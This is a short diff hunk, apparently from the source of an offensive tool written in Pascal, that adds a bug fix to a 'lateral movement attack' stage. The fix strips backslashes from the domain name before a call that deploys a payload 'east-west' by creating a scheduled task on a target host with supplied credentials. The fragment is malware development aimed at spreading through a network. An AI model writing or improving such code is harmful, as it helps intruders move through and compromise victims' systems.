@@ -541,6 +541,9 @@ end;
 
   //stage 3 - start lateral movment attack here
   writeln('[->] Deploying Payload east-west');
+
+  //fix bug4 - domain users are not allowed to access task scheduling
+  domain := stringreplace(domain,'\','',[rfReplaceAll,rfIgnoreCase]);
   eastwest(host,username,password,domain,share,host,payload); // that's will create a task on targeted system
 
 
